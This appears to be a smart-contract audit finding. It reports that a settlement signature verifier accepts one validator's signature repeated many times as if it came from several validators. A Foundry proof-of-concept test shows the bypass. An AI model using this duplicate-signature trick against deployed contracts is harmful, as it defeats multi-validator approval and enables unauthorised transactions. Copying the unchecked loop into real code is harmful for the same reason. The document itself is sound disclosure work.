# Vulnerability details

## Impact

The signatureVerifier does not detect whether the validators or signatures is duplicated. Only one validators's one signature is needed to complete the transaction.      

## Proof of Concept

```solidity
    function verifyECDSA(
        bytes32 msgHash,
        bytes calldata signatures
    ) internal view returns (bool) {
        require(
            signatures.length % 65 == 0,
            "Signature length must be a multiple of 65"
        );

        uint256 len = signatures.length;
        uint256 m = 0;
        for (uint256 i = 0; i < len; i += 65) {
            bytes memory sig = signatures[i:i + 65];
            /// @audit not check validators or signatures is duplicated
            if (
                validators[msgHash.recover(sig)] && ++m >= required_validators
            ) {
                return true;
            }
        }

        return false;
    }
```        

Note that this issue exists in both solidity and cairo. The POC of solidity is provided below:    

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "node_modules/@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {SettlementSignatureVerifier} from "contracts/SettlementSignatureVerifier.sol";

contract SignatureVerifierTest is Test {
    address public verifier;
    uint256 constant REQUIRED_VALIDATORS = 2;

    function setUp() public {
        verifier = address(new ERC1967Proxy(address(new SettlementSignatureVerifier()), abi.encodeWithSignature("initialize(address,uint256)", address(this), REQUIRED_VALIDATORS)));
        verifier.call(abi.encodeWithSignature("add_manager(address)", address(this)));
    }

    function testSignatureVerifierWithDuplicateValidators() public {
        (address validator, uint256 validatorPk) = makeAddrAndKey("validator1");
        verifier.call(abi.encodeWithSignature("add_validator(address)", validator));

        bytes32 msgHash = keccak256("test");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, msgHash);
        bytes memory signatures = abi.encodePacked(r, s, v);
        for (uint256 i = REQUIRED_VALIDATORS; i > 1; i /= 2) {
            signatures = abi.encodePacked(signatures, signatures);
        }
        
        (, bytes memory result) = verifier.call(abi.encodeWithSignature("verify(bytes32,bytes,uint8)", msgHash, signatures, 0));
        assert(abi.decode(result, (bool)));
    }
}
```
